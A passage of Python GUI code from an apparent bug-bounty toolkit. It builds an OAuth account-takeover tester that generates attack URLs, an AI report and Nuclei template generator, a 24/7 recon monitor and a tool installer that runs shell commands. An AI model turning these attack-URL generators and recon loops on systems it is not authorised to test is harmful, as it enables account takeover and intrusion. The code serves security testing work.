                                      "project":self.project.get() or "target","tool":"API Tester","status":"Open"})
                self.root.after(0, lambda: (self._refresh_findings(), log_fn("[✓] Done!", "ok")))
            threading.Thread(target=_go, daemon=True).start()

        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x', pady=(8,0))
        mk_btn(bf, "📥 Load Swagger", _load, CYAN).pack(side='left', ipady=5, padx=(0,8))
        mk_btn(bf, "🔬 Test All Endpoints", _test_all, RED, small=True).pack(side='left', padx=4)

    # ═════════════════════════════════════════════════════════════
    #  AI TOOL TABS
    # ═════════════════════════════════════════════════════════════
    def _build_smart_reporter_tab(self, frame):
        from modules.advanced.ai_exploit import generate_chain_analysis, generate_report
        frame.configure(bg=BG2)
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "SMART REPORT WRITER — AI Chains Vulnerabilities", "📊").pack(fill='x', pady=(0,8))
        crd = mk_card(pad, accent_top=True, accent_color=GREEN); crd.pack(fill='x', pady=(0,8))
        for line in ["AI analyzes ALL findings → finds exploit chains → writes combined report",
                     "SSRF + Cloud metadata = CRITICAL chain  ·  XSS + CSRF = ATO",
                     "Generates: HackerOne / Bugcrowd / Executive Summary"]:
            tk.Label(crd, text=f"  {line}", bg=BG3, fg=FG2, font=MONO_S).pack(anchor='w', padx=4, pady=1)
        tk.Frame(crd, height=4, bg=BG3).pack()
        r1 = mk_frame(pad, bg=BG2); r1.pack(fill='x', pady=(0,6))
        tk.Label(r1, text="Claude API Key:", bg=BG2, fg=FG3, font=MONO_S, width=15, anchor='e').pack(side='left', padx=(0,8))
        try: ck = load_cfg().get("api_keys",{}).get("claude_api_key","")
        except Exception: ck = ""
        ck_var = tk.StringVar(value=ck)
        mk_entry(r1, var=ck_var, w=46, show="●").pack(side='left', ipady=3)
        r2 = mk_frame(pad, bg=BG2); r2.pack(fill='x', pady=(0,6))
        tk.Label(r2, text="Platform:", bg=BG2, fg=FG3, font=MONO_S, width=15, anchor='e').pack(side='left', padx=(0,8))
        plat_var = tk.StringVar(value="hackerone")
        for p, c in [("HackerOne","hackerone"),("Bugcrowd","bugcrowd"),("Intigriti","intigriti"),("Executive","general")]:
            ttk.Radiobutton(r2, text=p, variable=plat_var, value=c).pack(side='left', padx=8)
        rep_txt = mk_stext(pad, h=20, bg=BG3, fg=FG, font_size=9)
        rep_txt.pack(fill='both', expand=True, pady=(8,0))
        def _run():
            api_key = ck_var.get().strip()
            if not api_key: messagebox.showwarning("API Key","Enter Claude API key first",parent=self.root); return
            findings = [f for f in load_findings() if f.get('project') == self.project.get() or not self.project.get()]
            if not findings: messagebox.showwarning("No Findings","No findings to report. Add findings first.",parent=self.root); return
            rep_txt.config(state='normal'); rep_txt.delete('1.0','end')
            rep_txt.insert('end',"⏳ AI analyzing findings and writing report...\n\n"); rep_txt.config(state='disabled')
            def _go():
                chain = generate_chain_analysis(findings, api_key, lambda m,t='': None)
                report_parts = [f"# {self.project.get() or 'Security'} — Bug Bounty Report\n\n"]
                report_parts.append("## Executive Summary\n\n")
                report_parts.append(chain + "\n\n")
                report_parts.append("## Individual Findings\n\n")
                for f in findings[:5]:
                    r = generate_report(f, plat_var.get(), api_key, lambda m,t='': None)
                    report_parts.append(f"---\n{r}\n\n")
                full_report = "".join(report_parts)
                proj = self.project.get() or "target"
                out_dir = LOGS_DIR / proj / "ai_exploits"
                out_dir.mkdir(parents=True, exist_ok=True)
                out_f = out_dir / f"smart_report_{plat_var.get()}.md"
                out_f.write_text(full_report, encoding='utf-8')
                def _done():
                    rep_txt.config(state='normal'); rep_txt.delete('1.0','end')
                    rep_txt.insert('end', full_report); rep_txt.config(state='disabled')
                    self.set_status(f"Report saved: {out_f.name}", GREEN)
                self.root.after(0, _done)
            threading.Thread(target=_go, daemon=True).start()
        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x', pady=(8,0))
        mk_btn(bf, "📊 Generate Smart Report", _run, GREEN).pack(side='left', ipady=5, padx=(0,8))
        mk_btn(bf, "📋 Copy", lambda: (self.root.clipboard_clear(),
            self.root.clipboard_append(rep_txt.get('1.0','end')), self.root.update()),
            ACCENT, small=True).pack(side='left', padx=4)

    def _build_nuclei_ai_tab(self, frame):
        from modules.advanced.ai_exploit import _call_claude
        frame.configure(bg=BG2)
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "NUCLEI CUSTOM TEMPLATE AI GENERATOR", "🔬").pack(fill='x', pady=(0,8))
        crd = mk_card(pad, accent_top=True, accent_color=PURPLE); crd.pack(fill='x', pady=(0,8))
        for line in ["Describe a vulnerability → AI generates complete Nuclei YAML template",
                     "Supports: http, dns, network, code matchers",
                     "Save directly to nuclei-templates/ folder"]:
            tk.Label(crd, text=f"  {line}", bg=BG3, fg=FG2, font=MONO_S).pack(anchor='w', padx=4, pady=1)
        tk.Frame(crd, height=4, bg=BG3).pack()
        r1 = mk_frame(pad, bg=BG2); r1.pack(fill='x', pady=(0,6))
        tk.Label(r1, text="Claude API Key:", bg=BG2, fg=FG3, font=MONO_S, width=15, anchor='e').pack(side='left', padx=(0,8))
        try: ck = load_cfg().get("api_keys",{}).get("claude_api_key","")
        except Exception: ck = ""
        ck_var2 = tk.StringVar(value=ck)
        mk_entry(r1, var=ck_var2, w=44, show="●").pack(side='left', ipady=3)
        tk.Label(pad, text="Describe the vulnerability / template to generate:",
                 bg=BG2, fg=FG3, font=MONO_S).pack(anchor='w', pady=(8,4))
        desc_txt = tk.Text(pad, height=5, bg=BG3, fg=FG, font=MONO_S,
                           relief='flat', bd=0, insertbackground=ACCENT, padx=8, pady=6,
                           highlightthickness=1, highlightbackground=BORDER2)
        desc_txt.pack(fill='x', pady=(0,8))
        desc_txt.insert('end', "Example: Detect exposed .env files with APP_KEY and DB_PASSWORD")
        nuclei_txt = mk_stext(pad, h=16, bg=BG3, fg=GREEN, font_size=9)
        nuclei_txt.pack(fill='both', expand=True)
        def _gen():
            api_key = ck_var2.get().strip()
            desc    = desc_txt.get('1.0','end').strip()
            if not api_key or not desc: return
            nuclei_txt.config(state='normal'); nuclei_txt.delete('1.0','end')
            nuclei_txt.insert('end',"⏳ AI generating Nuclei template...\n"); nuclei_txt.config(state='disabled')
            def _go():
                prompt = f"""Generate a complete, working Nuclei v3 YAML template for:

{desc}

Requirements:
- Use proper Nuclei v3 syntax
- Include id, info (name, author, severity, description, tags)
- Include the actual detection logic (matchers, extractors)
- Make it actually detect the vulnerability described
- Use variables where appropriate
- Output ONLY the YAML, no explanation

Generate the template now:"""
                system = "You are a Nuclei template expert. Generate complete, working Nuclei YAML templates only."
                result = _call_claude(system, prompt, api_key, max_tokens=2000)
                def _done():
                    nuclei_txt.config(state='normal'); nuclei_txt.delete('1.0','end')
                    nuclei_txt.insert('end', result); nuclei_txt.config(state='disabled')
                self.root.after(0, _done)
            threading.Thread(target=_go, daemon=True).start()

        def _save_template():
            content = nuclei_txt.get('1.0','end').strip()
            if not content: return
            import re as _re
            m = _re.search(r'^id:\s*(.+)$', content, _re.MULTILINE)
            fname = (m.group(1).strip().replace(" ","-") + ".yaml") if m else "ai-template.yaml"
            templates_dir = BASE_DIR / "nuclei-templates" / "ai-generated"
            templates_dir.mkdir(parents=True, exist_ok=True)
            out = templates_dir / fname
            out.write_text(content, encoding='utf-8')
            self.set_status(f"Template saved: {out}", GREEN)

        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x', pady=(8,0))
        mk_btn(bf, "🔬 Generate Template", _gen, PURPLE).pack(side='left', ipady=5, padx=(0,8))
        mk_btn(bf, "💾 Save to Templates", _save_template, GREEN, small=True).pack(side='left', padx=4)
        mk_btn(bf, "📋 Copy YAML", lambda: (self.root.clipboard_clear(),
            self.root.clipboard_append(nuclei_txt.get('1.0','end')), self.root.update()),
            ACCENT, small=True).pack(side='left', padx=4)

    def _build_oauth_ato_tab(self, frame):
        from modules.advanced.web_scanners import test_oauth_ato as _fn
        frame.configure(bg=BG2)
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "OAUTH ACCOUNT TAKEOVER AUTO-TESTER", "🔗").pack(fill='x', pady=(0,8))
        crd = mk_card(pad, accent_top=True, accent_color=PURPLE); crd.pack(fill='x', pady=(0,8))
        for line in ["Tests: CSRF (missing state), redirect_uri bypass, PKCE downgrade, implicit flow",
                     "Generates 6 attack URLs: open redirect, subdomain, scope escalation...",
                     "Paste the full OAuth /authorize URL to test"]:
            tk.Label(crd, text=f"  {line}", bg=BG3, fg=FG2, font=MONO_S).pack(anchor='w', padx=4, pady=1)
        tk.Frame(crd, height=4, bg=BG3).pack()

        tk.Label(pad, text="OAuth Authorization URL (full URL with params):",
                 bg=BG2, fg=FG3, font=MONO_S).pack(anchor='w', pady=(8,4))
        oauth_txt = tk.Text(pad, height=4, bg=BG3, fg=CYAN, font=MONO_S,
                            relief='flat', bd=0, insertbackground=ACCENT, padx=8, pady=6,
                            highlightthickness=1, highlightbackground=BORDER2, wrap='none')
        oauth_txt.pack(fill='x', pady=(0,8))
        oauth_txt.insert('end', "https://auth.example.com/oauth/authorize?client_id=APP_ID&redirect_uri=https://app.com/callback&response_type=code&scope=openid+email&state=RANDOM_STATE")

        # Results section
        nb2 = ttk.Notebook(pad); nb2.pack(fill='both', expand=True)
        log_f = tk.Frame(nb2, bg=BG2); nb2.add(log_f, text="  📋 Analysis  ")
        url_f = tk.Frame(nb2, bg=BG2); nb2.add(url_f, text="  🔗 Attack URLs  ")

        log_txt = mk_stext(log_f, h=14, bg=TERM_BG, fg=TERM_FG)
        log_txt.pack(fill='both', expand=True, padx=4, pady=4)

        url_cols = ('Attack', 'URL')
        url_tree = mk_tree(url_f, columns=url_cols, show='headings', height=12)
        url_tree.heading('Attack', text='Attack Type', anchor='w')
        url_tree.column('Attack', width=180, anchor='w')
        url_tree.heading('URL', text='Attack URL', anchor='w')
        url_tree.column('URL', width=600, anchor='w')
        vsb_u = ttk.Scrollbar(url_f, orient='vertical', command=url_tree.yview)
        url_tree.configure(yscrollcommand=vsb_u.set)
        tf_u = mk_frame(url_f, bg=BG2); tf_u.pack(fill='both', expand=True, padx=4, pady=4)
        url_tree.pack(side='left', fill='both', expand=True, in_=tf_u)
        vsb_u.pack(side='right', fill='y', in_=tf_u)
        # Double-click copies URL
        def _copy_atk_url(e):
            sel = url_tree.selection()
            if not sel: return
            url = str(url_tree.item(sel[0])['values'][1])
            self.root.clipboard_clear(); self.root.clipboard_append(url); self.root.update()
            self.set_status("Attack URL copied!", GREEN)
        url_tree.bind('<Double-1>', _copy_atk_url)

        self._oauth_result = None

        def log_fn(m, t='info'):
            clr = {'ok':GREEN,'warn':YELLOW,'err':RED,'info':CYAN,'dim':FG3}.get(t,FG)
            log_txt.config(state='normal'); log_txt.insert('end', m+'\n', t)
            log_txt.tag_config(t, foreground=clr, font=(_MONO_FACE,9))
            log_txt.see('end'); log_txt.config(state='disabled')

        def _run():
            url = oauth_txt.get('1.0','end').strip()
            if not url or not url.startswith('http'):
                messagebox.showwarning("URL", "Paste a full OAuth authorization URL", parent=self.root)
                return
            log_txt.config(state='normal'); log_txt.delete('1.0','end'); log_txt.config(state='disabled')
            url_tree.delete(*url_tree.get_children())
            def _go():
                r = _fn(url, log_cb=log_fn)
                self._oauth_result = r
                def _upd():
                    # Populate attack URLs tree
                    for name, atk_url in r.get('attack_urls',{}).items():
                        url_tree.insert('','end', values=(name, atk_url))
                    # Save findings
                    if r.get('vulnerable'):
                        for f in r.get('findings',[]):
                            save_finding({
                                "title": f"OAuth {f.get('type','Issue')}: {url[:50]}",
                                "url": url, "type": "OAuth Misconfiguration",
                                "severity": f.get('severity','HIGH'), "cvss_score":"8.0",
                                "description": f.get('detail', str(f)),
                                "project": self.project.get() or "target",
                                "tool": "OAuth ATO Tester", "status": "Open"
                            })
                        self._refresh_findings()
                        log_fn(f"\n[✓] {len(r['findings'])} findings saved!", "ok")
                    log_fn(f"\n[*] Double-click attack URLs to copy them", "info")
                self.root.after(0, _upd)
            threading.Thread(target=_go, daemon=True).start()

        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x', pady=(8,0))
        mk_btn(bf, "🔗 Test OAuth Flow", _run, PURPLE).pack(side='left', ipady=5, padx=(0,8))
        mk_btn(bf, "📋 Copy All Attack URLs",
               lambda: (self.root.clipboard_clear(),
                        self.root.clipboard_append(
                            "\n".join(f"{n}: {u}" for n,u in
                                      (self._oauth_result or {}).get('attack_urls',{}).items())),
                        self.root.update()), CYAN, small=True).pack(side='left', padx=4)

    # ═════════════════════════════════════════════════════════════
    #  📡  LIVE RECON DASHBOARD — 24/7 Monitor
    # ═════════════════════════════════════════════════════════════
    def _build_live_dashboard_tab(self, frame):
        frame.configure(bg=BG2)
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "LIVE RECON DASHBOARD — 24/7 Asset Monitor", "📡").pack(fill='x', pady=(0,8))

        # Config row
        cfg = mk_card(pad, accent_top=True, accent_color=CYAN); cfg.pack(fill='x', pady=(0,8))
        cfg_inner = mk_frame(cfg, bg=BG3); cfg_inner.pack(fill='x', padx=12, pady=8)

        r1 = mk_frame(cfg_inner, bg=BG3); r1.pack(fill='x', pady=2)
        tk.Label(r1, text="Target Domain:", bg=BG3, fg=FG3, font=MONO_S, width=16, anchor='e').pack(side='left', padx=(0,8))
        self._live_target = tk.StringVar(value=self.project.get() or "")
        mk_entry(r1, var=self._live_target, w=32).pack(side='left', ipady=3)
        tk.Label(r1, text=" Interval (min):", bg=BG3, fg=FG3, font=MONO_S).pack(side='left', padx=(12,4))
        self._live_interval = tk.StringVar(value="15")
        mk_entry(r1, var=self._live_interval, w=5).pack(side='left', ipady=3)

        r2 = mk_frame(cfg_inner, bg=BG3); r2.pack(fill='x', pady=4)
        tk.Label(r2, text="Monitor:", bg=BG3, fg=FG3, font=MONO_S, width=16, anchor='e').pack(side='left', padx=(0,8))
        self._live_checks = {}
        for label, key in [("New Subdomains","subs"),("New URLs","urls"),
                            ("HTTP Changes","http"),("New Findings","vulns")]:
            v = tk.BooleanVar(value=True)
            ttk.Checkbutton(r2, text=label, variable=v).pack(side='left', padx=8)
            self._live_checks[key] = v

        # Status bar
        self._live_status_lbl = tk.Label(pad, text="● STOPPED",
                                          bg=BG2, fg=RED, font=MONO_B)
        self._live_status_lbl.pack(anchor='w', pady=(0,6))

        # Split: log left, changes right
        paned = tk.PanedWindow(pad, orient='horizontal', bg=BG, sashwidth=4)
        paned.pack(fill='both', expand=True)

        # Left: live log
        left = mk_frame(paned, bg=BG2); paned.add(left, stretch='always')
        tk.Label(left, text="LIVE LOG", bg=BG2, fg=ACCENT, font=MONO_B).pack(anchor='w', pady=(0,4))
        self._live_log = mk_stext(left, h=22, bg=TERM_BG, fg=TERM_FG)
        self._live_log.pack(fill='both', expand=True)

        # Right: changes detected
        right = mk_frame(paned, bg=BG2); paned.add(right, width=360)
        tk.Label(right, text="CHANGES DETECTED", bg=BG2, fg=RED, font=MONO_B).pack(anchor='w', pady=(0,4))
        chg_cols = ('Time','Type','Detail')
        self._live_changes = mk_tree(right, columns=chg_cols, show='headings', height=22)
        for c,w in [('Time',80),('Type',100),('Detail',200)]:
            self._live_changes.heading(c, text=c, anchor='w')
            self._live_changes.column(c, width=w, anchor='w')
        self._live_changes.tag_configure('new',  foreground=GREEN, background=BG3)
        self._live_changes.tag_configure('vuln', foreground=RED, background=BG3)
        self._live_changes.tag_configure('info', foreground=CYAN, background=BG3)
        vsb_lv = ttk.Scrollbar(right, orient='vertical', command=self._live_changes.yview)
        self._live_changes.configure(yscrollcommand=vsb_lv.set)
        tf_lv = mk_frame(right, bg=BG2); tf_lv.pack(fill='both', expand=True)
        self._live_changes.pack(side='left', fill='both', expand=True, in_=tf_lv)
        vsb_lv.pack(side='right', fill='y', in_=tf_lv)

        self._live_running   = False
        self._live_job       = None
        self._live_snapshots = {}  # baseline

        def _log(m, t='info'):
            clr = {'ok':GREEN,'warn':YELLOW,'err':RED,'info':CYAN,'dim':FG3}.get(t,FG)
            self._live_log.config(state='normal')
            from datetime import datetime as _dt
            ts = _dt.now().strftime("%H:%M:%S")
            self._live_log.insert('end', f"[{ts}] {m}\n", t)
            self._live_log.tag_config(t, foreground=clr, font=(_MONO_FACE,9))
            self._live_log.see('end')
            self._live_log.config(state='disabled')

        def _add_change(chg_type, detail, tag='new'):
            from datetime import datetime as _dt
            ts = _dt.now().strftime("%H:%M:%S")
            self._live_changes.insert('','0', values=(ts, chg_type, detail[:60]), tags=(tag,))

        def _do_check():
            if not self._live_running: return
            domain = self._live_target.get().strip()
            if not domain:
                _log("No target set — enter domain above", "warn"); return

            _log(f"[*] Running check for {domain}...", "dim")

            # 1. Subdomain check
            if self._live_checks.get('subs',tk.BooleanVar()).get():
                try:
                    import urllib.request as _ur
                    r = _ur.urlopen(f"https://crt.sh/?q=%.{domain}&output=json", timeout=10)
                    data = json.loads(r.read())
                    current = set(d.get('name_value','').replace('*.','') for d in data)
                    prev = self._live_snapshots.get('subs', set())
                    new_subs = current - prev
                    if new_subs:
                        for s in new_subs:
                            _log(f"[NEW SUBDOMAIN] {s}", "ok")
                            _add_change("New Subdomain", s, 'new')
                        self._live_snapshots['subs'] = current
                    elif not prev:
                        self._live_snapshots['subs'] = current
                        _log(f"[*] Baseline: {len(current)} subdomains", "dim")
                except Exception as e:
                    _log(f"[-] Subdomain check failed: {str(e)[:40]}", "err")

            # 2. HTTP header check
            if self._live_checks.get('http',tk.BooleanVar()).get():
                try:
                    import urllib.request as _ur
                    req = _ur.Request(f"https://{domain}", headers={"User-Agent":"Mozilla/5.0"})
                    resp = _ur.urlopen(req, timeout=8)
                    hdrs = dict(resp.headers)
                    prev_hdrs = self._live_snapshots.get('http_hdrs', {})
                    changed = {k:v for k,v in hdrs.items() if prev_hdrs.get(k) != v}
                    if changed and prev_hdrs:
                        for k,v in list(changed.items())[:3]:
                            _log(f"[HTTP CHANGE] {k}: {v[:40]}", "warn")
                            _add_change("HTTP Change", f"{k}: {v[:30]}", 'info')
                    self._live_snapshots['http_hdrs'] = hdrs
                except Exception: pass

            # 3. New findings check
            if self._live_checks.get('vulns',tk.BooleanVar()).get():
                all_f = [f for f in load_findings() if f.get('project') == domain]
                prev_count = self._live_snapshots.get('vuln_count', 0)
                if len(all_f) > prev_count and prev_count > 0:
                    diff = len(all_f) - prev_count
                    _log(f"[NEW FINDING] {diff} new finding(s)!", "ok")
                    _add_change("New Finding", f"+{diff} findings", 'vuln')
                self._live_snapshots['vuln_count'] = len(all_f)

            # Schedule next check
            try:
                interval = max(1, int(self._live_interval.get())) * 60 * 1000  # ms
            except Exception:
                interval = 15 * 60 * 1000
            if self._live_running:
                self._live_job = self.root.after(interval, _do_check)
                next_min = interval // 60000
                _log(f"[*] Next check in {next_min} min", "dim")

        def _start():
            if self._live_running: return
            domain = self._live_target.get().strip()
            if not domain:
                messagebox.showwarning("Target","Enter a target domain first", parent=self.root)
                return
            self._live_running = True
            self._live_snapshots = {}
            self._live_status_lbl.config(text=f"● RUNNING — monitoring {domain}", fg=GREEN)
            self.set_status(f"Live dashboard: monitoring {domain}", GREEN)
            self._live_log.config(state='normal'); self._live_log.delete('1.0','end')
            self._live_log.config(state='disabled')
            self._live_changes.delete(*self._live_changes.get_children())
            _log(f"[*] Starting 24/7 monitor for: {domain}", "ok")
            _log(f"[*] Check interval: {self._live_interval.get()} minutes", "dim")
            _do_check()  # immediate first check

        def _stop():
            self._live_running = False
            if self._live_job:
                self.root.after_cancel(self._live_job)
                self._live_job = None
            self._live_status_lbl.config(text="● STOPPED", fg=RED)
            self.set_status("Live dashboard stopped", YELLOW)
            _log("[*] Monitor stopped", "warn")

        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x', pady=(8,0))
        mk_btn(bf, "▶ Start Monitor", _start, GREEN).pack(side='left', ipady=5, padx=(0,8))
        mk_btn(bf, "⬛ Stop",          _stop,  RED,   small=True).pack(side='left', padx=4)
        mk_btn(bf, "🔄 Check Now",
               lambda: threading.Thread(target=_do_check, daemon=True).start() if self._live_running else _do_check(),
               CYAN, small=True).pack(side='left', padx=4)
        mk_btn(bf, "🗑 Clear Log",
               lambda: (self._live_log.config(state='normal'),
                        self._live_log.delete('1.0','end'),
                        self._live_log.config(state='disabled')), FG3, small=True).pack(side='left', padx=4)

    # ═══════════════════════════════════════════════════════════════
    #  TIER 1: TOOL AUTO-INSTALLER
    # ═══════════════════════════════════════════════════════════════
    def _settings_tool_installer(self, frame):
        frame.configure(bg=BG2)
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "TOOL AUTO-INSTALLER — One-Click Setup", "🔧").pack(fill='x', pady=(0,8))

        info = mk_card(pad, accent_top=True, accent_color=ACCENT); info.pack(fill='x', pady=(0,10))
        tk.Label(info, text=(
            "  Installs all Go tools + system packages automatically\n"
            "  Green = installed · Red = missing · Click to install individually\n"
            "  'Install All Missing' installs everything in one go"
        ), bg=BG3, fg=FG2, font=MONO_S, justify='left').pack(anchor='w', padx=12, pady=8)

        import shutil, platform as _plat

        TOOLS = [
            # (name, check_cmd, install_cmd, category, description)
            ("subfinder",    "subfinder",    "go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest", "Recon",   "Subdomain enumeration"),
            ("httpx",        "httpx",        "go install github.com/projectdiscovery/httpx/cmd/httpx@latest",            "Recon",   "HTTP probing"),
            ("nuclei",       "nuclei",       "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",       "Scan",    "Vulnerability scanner"),
            ("katana",       "katana",       "go install github.com/projectdiscovery/katana/cmd/katana@latest",          "Recon",   "Web crawler"),
            ("dnsx",         "dnsx",         "go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest",              "Recon",   "DNS toolkit"),
            ("gau",          "gau",          "go install github.com/lc/gau/v2/cmd/gau@latest",                          "Recon",   "URL fetcher"),
            ("waybackurls",  "waybackurls",  "go install github.com/tomnomnom/waybackurls@latest",                      "Recon",   "Wayback URLs"),
            ("ffuf",         "ffuf",         "go install github.com/ffuf/ffuf/v2@latest",                               "Fuzz",    "Fast fuzzer"),
            ("gobuster",     "gobuster",     "go install github.com/OJ/gobuster/v3@latest",                             "Fuzz",    "Directory/DNS busting"),
            ("dalfox",       "dalfox",       "go install github.com/hahwul/dalfox/v2@latest",                           "Exploit", "XSS scanner"),
            ("gowitness",    "gowitness",    "go install github.com/sensepost/gowitness@latest",                        "Utils",   "Screenshot tool"),
            ("amass",        "amass",        "go install github.com/owasp-amass/amass/v4/...@master",                   "Recon",   "Attack surface mapping"),
            ("nmap",         "nmap",         "sudo apt install -y nmap",                                                 "Scan",    "Network scanner"),
            ("nikto",        "nikto",        "sudo apt install -y nikto",                                               "Scan",    "Web server scanner"),
            ("wafw00f",      "wafw00f",      "sudo apt install -y wafw00f",                                             "Recon",   "WAF detector"),
            ("sqlmap",       "sqlmap",       "pip install sqlmap --break-system-packages",                              "Exploit", "SQL injection"),
            ("arjun",        "arjun",        "pip install arjun --break-system-packages",                               "Recon",   "Parameter discovery"),
        ]

        # Status cache
        tool_status = {}
        for t in TOOLS:
            tool_status[t[0]] = bool(shutil.which(t[0]))

        # Filter / search
        top_r = mk_frame(pad, bg=BG2); top_r.pack(fill='x', pady=(0,6))
        ts_var = tk.StringVar()
        mk_entry(top_r, var=ts_var, w=22, placeholder="Search tools...").pack(side='left', ipady=3)
        cat_var = tk.StringVar(value="All")
        cats = ["All"] + sorted(set(t[3] for t in TOOLS))
        ttk.Combobox(top_r, textvariable=cat_var, values=cats, width=10, font=MONO_S).pack(side='left', padx=8)
        ins_lbl = tk.Label(top_r, text="", bg=BG2, fg=FG3, font=MONO_S)
        ins_lbl.pack(side='right', padx=8)

        # Tool grid
        cols = ('Tool','Category','Description','Status','Action')
        tree = mk_tree(pad, columns=cols, show='headings', height=16)
        for c, w in [('Tool',110),('Category',70),('Description',180),('Status',80),('Action',120)]:
            tree.heading(c, text=c, anchor='w')
            tree.column(c, width=w, anchor='w')
        tree.tag_configure('installed', foreground=GREEN, background=BG3)
        tree.tag_configure('missing',   foreground=RED, background=BG3)
        vsb_t = ttk.Scrollbar(pad, orient='vertical', command=tree.yview)
        tree.configure(yscrollcommand=vsb_t.set)
        tf_t = mk_frame(pad, bg=BG2); tf_t.pack(fill='both', expand=True)
        tree.pack(side='left', fill='both', expand=True, in_=tf_t)
        vsb_t.pack(side='right', fill='y', in_=tf_t)

        log_txt = mk_stext(pad, h=6, bg=TERM_BG, fg=TERM_FG)
        log_txt.pack(fill='x', pady=(6,0))

        def _log(m, t='info'):
            clr = {'ok':GREEN,'warn':YELLOW,'err':RED,'info':CYAN,'dim':FG3}.get(t, FG)
            log_txt.config(state='normal')
            log_txt.insert('end', m+'\n', t)
            log_txt.tag_config(t, foreground=clr, font=(_MONO_FACE,9))
            log_txt.see('end')
            log_txt.config(state='disabled')

        def _refresh_tree():
            q   = ts_var.get().lower()
            cat = cat_var.get()
            tree.delete(*tree.get_children())
            inst = miss = 0
            for name, _, _, category, desc in TOOLS:
                if q and q not in name.lower() and q not in desc.lower(): continue
                if cat != "All" and category != cat: continue
                ok  = bool(shutil.which(name))
                tool_status[name] = ok
                tag = 'installed' if ok else 'missing'
                if ok: inst += 1
                else:  miss += 1
                tree.insert('','end',
                    values=(name, category, desc,
                            '✅ OK' if ok else '❌ Missing',
                            '— ' if ok else 'Click to install'),
                    tags=(tag,), iid=name)
            ins_lbl.config(
                text=f"✅ {inst} installed  ❌ {miss} missing",
                fg=GREEN if miss==0 else YELLOW)

        ts_var.trace_add('write', lambda *_: _refresh_tree())
        cat_var.trace_add('write', lambda *_: _refresh_tree())

        def _install_tool(name):
            tool = next((t for t in TOOLS if t[0]==name), None)
            if not tool: return
            _, _, cmd, _, _ = tool
            _log(f"[*] Installing {name}...", "info")
            def _go():
                import subprocess
                try:
                    result = subprocess.run(
                        cmd, shell=True, capture_output=True, text=True, timeout=120)
                    if result.returncode == 0:
                        self.root.after(0, lambda: (
                            _log(f"[✓] {name} installed!", "ok"),
                            _refresh_tree()))
                    else:
                        self.root.after(0, lambda e=result.stderr[:100]: (
                            _log(f"[-] {name} failed: {e}", "err"),))
                except Exception as e:
                    self.root.after(0, lambda: _log(f"[-] Error: {e}", "err"))
            threading.Thread(target=_go, daemon=True).start()

        def _on_click(e):
            sel = tree.selection()
            if not sel: return
            name = sel[0]
            if not tool_status.get(name, False):
                _install_tool(name)

        def _install_all_missing():
            missing_tools = [t for t in TOOLS if not shutil.which(t[0])]
            if not missing_tools:
                _log("[✓] All tools already installed!", "ok"); return
            _log(f"[*] Installing {len(missing_tools)} missing tools...", "info")
            def _go():
                for t in missing_tools:
                    import subprocess
                    try:
                        subprocess.run(t[2], shell=True, capture_output=True, timeout=120)
                    except Exception: pass
                self.root.after(0, lambda: (_refresh_tree(), _log("[✓] Done!", "ok")))
            threading.Thread(target=_go, daemon=True).start()

        tree.bind('<Double-1>', _on_click)

        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x', pady=(6,0))
        mk_btn(bf, "🔄 Refresh Status",    _refresh_tree,       FG3,    small=True).pack(side='left', padx=4)
        mk_btn(bf, "📦 Install All Missing",_install_all_missing, GREEN).pack(side='left', padx=4, ipady=4)
        mk_btn(bf, "📋 Show Install Cmds",
               lambda: messagebox.showinfo("Install Commands",
                   "\n".join(f"{t[0]}: {t[2]}" for t in TOOLS), parent=self.root),
               FG2, small=True).pack(side='left', padx=4)

        _refresh_tree()

    # ═══════════════════════════════════════════════════════════════
    #  TIER 1: SCOPE MANAGER
    # ═══════════════════════════════════════════════════════════════
    def _settings_scope_manager(self, frame):
        frame.configure(bg=BG2)
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "SCOPE MANAGER — In-Scope / Out-of-Scope", "🎯").pack(fill='x', pady=(0,8))

        info = mk_card(pad, accent_top=True, accent_color=GREEN); info.pack(fill='x', pady=(0,10))
        tk.Label(info, text=(
            "  Define scope for active project — all scans will auto-filter results\n"
            "  Supports: domains, IPs, CIDR ranges, wildcards (*.example.com)\n"
            "  Out-of-scope items are shown in red and excluded from reports"
        ), bg=BG3, fg=FG2, font=MONO_S, justify='left').pack(anchor='w', padx=12, pady=8)

        # Project selector
        r0 = mk_frame(pad, bg=BG2); r0.pack(fill='x', pady=(0,8))
        tk.Label(r0, text="Project:", bg=BG2, fg=FG3, font=MONO_S, width=10, anchor='e').pack(side='left', padx=(0,8))
        scope_proj = tk.StringVar(value=self.project.get())
        proj_cb = ttk.Combobox(r0, textvariable=scope_proj,
                               values=[p.get('name','') for p in load_projects()],
                               width=26, font=MONO_S)
        proj_cb.pack(side='left')

        nb_scope = ttk.Notebook(pad); nb_scope.pack(fill='both', expand=True, pady=(8,0))
        in_f  = tk.Frame(nb_scope, bg=BG2); nb_scope.add(in_f,  text="  ✅ In-Scope  ")
        out_f = tk.Frame(nb_scope, bg=BG2); nb_scope.add(out_f, text="  ❌ Out-of-Scope  ")
        chk_f = tk.Frame(nb_scope, bg=BG2); nb_scope.add(chk_f, text="  🔍 Check Target  ")

        def _make_scope_panel(parent, scope_key, color):
            p = mk_frame(parent, bg=BG2); p.pack(fill='both', expand=True, padx=8, pady=8)
            tk.Label(p, text=f"One entry per line — domains, IPs, CIDRs, wildcards",
                     bg=BG2, fg=FG3, font=MONO_S).pack(anchor='w', pady=(0,4))

            txt = tk.Text(p, height=14, bg=BG3, fg=color, font=MONO_S,
                          relief='flat', bd=0, insertbackground=ACCENT, padx=8, pady=6,
